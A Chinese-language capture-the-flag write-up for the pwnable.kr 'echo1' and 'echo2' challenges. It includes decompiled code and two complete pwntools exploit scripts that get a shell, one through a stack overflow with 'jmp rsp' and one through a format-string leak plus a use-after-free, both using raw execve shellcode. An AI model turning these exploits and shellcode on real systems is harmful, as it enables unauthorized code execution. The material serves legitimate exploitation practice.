# pwnable.kr  echo1&2

### 0x1 echo1

#### 1x1 分析

看一下安全性：

```shell
[*] './echo1/echo1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

什么都没有开。

`main()`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int *v3; // rsi
  _QWORD *ptr_stack; // rax
  unsigned int choice; // [rsp+Ch] [rbp-24h]
  __int64 v7; // [rsp+10h] [rbp-20h]
  __int64 v8; // [rsp+18h] [rbp-18h]
  __int64 v9; // [rsp+20h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  ptr = malloc(0x28uLL);
  *((_QWORD *)ptr + 3) = hello;
  *((_QWORD *)ptr + 4) = byebye;
  printf("hey, what's your name? : ", 0LL);
  v3 = (unsigned int *)&v7;
  __isoc99_scanf("%24s", &v7);
  ptr_stack = ptr;
  *(_QWORD *)ptr = v7;
  ptr_stack[1] = v8;
  ptr_stack[2] = v9;
  id = v7;
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  choice = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ", v3);
        v3 = &choice;
        __isoc99_scanf("%d", &choice);
        getchar();
        if ( choice > 3 )
          break;
        ((void (__fastcall *)(const char *, unsigned int *))func[choice - 1])("%d", &choice);
      }
      if ( choice == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)", &choice);
    choice = getchar();
  }
  while ( choice != 'y' );
  puts("bye");
  return 0;
}
```

在`bss`段有一个`ptr`和一个`id`。`ptr`的前`0x18`的长度我们输入控制，另外`0x10`是两个函数指针:

`hello`和`byebye`。都只是单纯的输出。

```c
__int64 __fastcall hello(__int64 a1)
{
  printf("hello %s\n", a1);
  return 0LL;
}

__int64 __fastcall byebye(__int64 a1)
{
  printf("goodbye %s\n", a1);
  return 0LL;
}
```

然后是是个菜单，调用三个函数`echo1|2|3`。但是这里只有`echo1`有东西。

```c
__int64 echo1()
{
  char s; // [rsp+0h] [rbp-20h]

  (*((void (__fastcall **)(void *))ptr + 3))(ptr);
  get_input(&s, 0x80);                          // overflow
  puts(&s);
  (*((void (__fastcall **)(void *, signed __int64))ptr + 4))(ptr, 0x80LL);
  return 0LL;
}
```

有一个栈溢出。

**思路**：

这里有一个巧妙的办法，先在`id`里也就是`ptr[0]`存入`jmp rsp`，然后`rip`就迁移到栈上了，然后在利用栈溢出写入`shellcode`。执行`shellcode`。

#### 1x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./echo1')
p = remote('pwnable.kr', 9010)

id_bss = 0x6020A0
shellcode = asm(shellcraft.sh())
p.sendlineafter("hey, what's your name? :", asm('jmp rsp'))
p.sendlineafter('>', '1')
p.sendline('a' * 0x28 + p64(id_bss) + shellcode)
p.interactive()
```

### 0x2 echo2

#### 2x1 分析

看一下安全性：

```shell
[*] './echo2/echo2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

还是什么都没开

这道题大致的逻辑跟上道题一样，但是`echo1|2|3`的内容发生改变。`echo1`没有内容。

```c
__int64 echo2()
{
  char format; // [rsp+0h] [rbp-20h]

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(&format, 0x20);
  printf(&format, 0x20LL);                      // FMT
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

有一个格式化字符串漏洞。可以考虑泄漏或者覆盖栈。

```c
__int64 echo3()
{
  char *s; // ST08_8

  (*((void (__fastcall **)(void *))o + 3))(o);
  s = (char *)malloc(0x20uLL);
  get_input(s, 0x20);
  puts(s);
  free(s);
  (*((void (__fastcall **)(void *, signed __int64))o + 4))(o, 0x20LL);
  return 0LL;
}
```

这里我们可以注意到`s`申请的内存实际上和`main`函数申请的内存是一样大的。

可以结合`cleanup`来使用

```c
// o == ptr
void cleanup()
{
  free(o);
}
```

这样我们先`cleanup`然后`echo3`就可以修改堆里的那两个函数指针。

**思路**:

将`shellcode`存在栈里，然后用格式化字符串泄漏栈地址从而的到`shellcode`的地址，然后修改`ptr[4]`为`shellcode`地址拿到`shell`。

**有个知识点需要注意：就是`fgets`只会读取`n - 1`个字节然后填充`0`。**

#### 2x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
shellcode += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
# test = 'aaaa'
#p = process('./echo2')
p = remote("pwnable.kr", 9011)
p.sendlineafter("hey, what's your name? : ", shellcode)
# leak stack
p.sendlineafter(">", '2')
p.recvline()
p.sendline("%10$p")
stack = eval(p.recv(14)) - 0x20
print (hex(stack))
# gdb.attach(p, '\n')
# pause()
#UAF get shell
p.sendlineafter(">", '4')
p.sendafter("Are you sure you want to exit? (y/n)", 'n')
p.sendlineafter("> ", '3')
p.recvline()
p.send('a'*0x18 + p64(stack))
p.interactive()
```

